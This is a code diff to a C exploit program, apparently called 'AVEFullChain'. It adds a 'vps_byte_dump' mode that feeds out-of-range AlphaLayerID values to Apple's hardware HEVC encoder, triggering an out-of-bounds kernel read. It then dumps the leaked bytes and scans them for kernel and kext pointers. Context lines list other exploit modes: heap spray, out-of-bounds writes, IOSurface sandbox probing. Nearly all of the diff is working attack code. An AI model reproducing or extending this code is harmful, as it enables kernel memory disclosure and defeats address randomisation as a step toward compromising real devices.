@@ -7226,6 +7226,191 @@ vps_cd_done:
 
         rlog("\n=== HEAP_SPRAY_OOB complete ===\n");
 
+    } else if (strcmp(mode, "vps_byte_dump") == 0) {
+        /*
+         * vps_byte_dump — Dump raw VPS NAL bytes at varying AlphaLayerID values
+         *
+         * The kernel indexes layer_id_in_nuh[64] with AlphaLayerID.
+         * For values >= 64, it reads OOB from adjacent struct fields
+         * and encodes those values into the VPS NAL output.
+         * This is an INFO LEAK — VPS bytes at OOB indices contain
+         * kernel heap data that gets sent back to userspace.
+         *
+         * Uses regular HEVC codec (not muxa) since it produces
+         * full VPS output for all AlphaLayerID values.
+         */
+        int max_aid = (argc > 2) ? atoi(argv[2]) : 128;
+        if (max_aid < 1) max_aid = 1;
+        if (max_aid > 255) max_aid = 255;
+
+        rlog("=== VPS_BYTE_DUMP: Kernel info leak via OOB VPS index ===\n");
+        rlog("AlphaLayerID range: 0-%d (OOB starts at 64)\n\n", max_aid);
+
+        /* First, get baseline VPS at AlphaLayerID=0 */
+        uint8_t baseline_vps[512];
+        size_t baseline_len = 0;
+        {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("FAIL: baseline session create\n"); goto done; }
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            int zero = 0;
+            CFNumberRef zn = CFNumberCreate(NULL, kCFNumberIntType, &zero);
+            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), zn);
+            CFRelease(zn);
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (st != noErr) { rlog("FAIL: baseline prepare=%d\n", (int)st); VTCompressionSessionInvalidate(s); CFRelease(s); goto done; }
+            g_encode_done = 0;
+            encode_one(s, 0, w, h);
+            for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
+            if (g_saved_fmt) {
+                const uint8_t *ptr = NULL;
+                size_t sz = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
+                if (ptr && sz > 0 && sz <= sizeof(baseline_vps)) {
+                    memcpy(baseline_vps, ptr, sz);
+                    baseline_len = sz;
+                }
+            }
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+        }
+        rlog("Baseline VPS (AlphaLayerID=0): %zu bytes\n", baseline_len);
+        if (baseline_len > 0) {
+            rlog("  ");
+            for (size_t j = 0; j < baseline_len; j++) {
+                rlog("%02x", baseline_vps[j]);
+                if ((j+1) % 32 == 0) rlog("\n  ");
+                else if ((j+1) % 4 == 0) rlog(" ");
+            }
+            rlog("\n");
+        }
+
+        /* Now sweep through AlphaLayerID values and compare */
+        int test_aids[] = {1, 2, 32, 62, 63, 64, 65, 66, 96, 100,
+                           112, 127, 128, 160, 192, 200, 224, 255};
+        int n_test = sizeof(test_aids) / sizeof(test_aids[0]);
+
+        rlog("\n--- Sweep: comparing VPS bytes at each AlphaLayerID ---\n");
+        rlog("(differences from baseline reveal kernel heap data)\n\n");
+
+        for (int t = 0; t < n_test; t++) {
+            int aid = test_aids[t];
+            if (aid > max_aid) continue;
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("AID=%d: session fail\n", aid); continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+            OSStatus sp = VTSessionSetProperty(s,
+                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (st != noErr) {
+                rlog("AID=%d: set=%d prepare=%d (SKIP)\n", aid, (int)sp, (int)st);
+                VTCompressionSessionInvalidate(s); CFRelease(s); continue;
+            }
+
+            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
+            g_encode_done = 0;
+            encode_one(s, 0, w, h);
+            for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
+
+            rlog("AID=%3d: set=%d prepare=%d encode=%d psets=%zu",
+                aid, (int)sp, 0, (int)g_cb_status, g_last_pset_count);
+
+            if (g_saved_fmt && g_last_pset_count > 0) {
+                /* Dump ALL parameter sets */
+                size_t pcount = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
+
+                for (size_t pi = 0; pi < pcount && pi < 10; pi++) {
+                    const uint8_t *ptr = NULL;
+                    size_t sz = 0;
+                    int nal_hdr = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                        g_saved_fmt, pi, &ptr, &sz, NULL, &nal_hdr);
+                    if (!ptr || sz == 0) continue;
+
+                    rlog("\n  pset[%zu] nal=%d len=%zu: ", pi, nal_hdr, sz);
+                    size_t dlen = (sz > 128) ? 128 : sz;
+                    for (size_t j = 0; j < dlen; j++) {
+                        rlog("%02x", ptr[j]);
+                        if ((j+1) % 32 == 0) rlog("\n    ");
+                        else if ((j+1) % 4 == 0) rlog(" ");
+                    }
+                    if (dlen < sz) rlog("... +%zu", sz - dlen);
+
+                    /* Compare with baseline if same pset index 0 */
+                    if (pi == 0 && baseline_len > 0 && sz > 0) {
+                        size_t cmp_len = (sz < baseline_len) ? sz : baseline_len;
+                        int diffs = 0;
+                        rlog("\n  DIFF vs baseline: ");
+                        for (size_t j = 0; j < cmp_len; j++) {
+                            if (ptr[j] != baseline_vps[j]) {
+                                rlog("[%zu]=%02x→%02x ", j, baseline_vps[j], ptr[j]);
+                                diffs++;
+                            }
+                        }
+                        if (sz != baseline_len)
+                            rlog("LEN:%zu→%zu ", baseline_len, sz);
+                        if (diffs == 0 && sz == baseline_len)
+                            rlog("(identical)");
+                        else
+                            rlog("(%d byte diffs)", diffs);
+
+                        /* Check for suspicious leaked values */
+                        if (aid >= 64 && diffs > 0) {
+                            rlog("\n  *** OOB INDEX %d: leaked %d bytes of kernel heap data ***", aid, diffs);
+                            /* Scan for pointer-like values */
+                            if (sz >= 8) {
+                                for (size_t j = 0; j <= sz - 8; j += 4) {
+                                    uint64_t qw;
+                                    memcpy(&qw, ptr + j, 8);
+                                    if ((qw >> 40) == 0xfffffe) {
+                                        rlog("\n  *** KERNEL PTR at byte %zu: 0x%016llx ***",
+                                            j, (unsigned long long)qw);
+                                    }
+                                    if ((qw >> 40) == 0xffff80) {
+                                        rlog("\n  *** KEXT PTR at byte %zu: 0x%016llx ***",
+                                            j, (unsigned long long)qw);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            rlog("\n\n");
+
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            usleep(50000); /* 50ms between sessions */
+        }
+
+        rlog("=== VPS_BYTE_DUMP complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -7272,6 +7457,7 @@ vps_cd_done:
         rlog("  vps_corrupt_detect [aid] [rounds] -- Detect OOB VPS write corruption\n");
         rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
         rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
+        rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
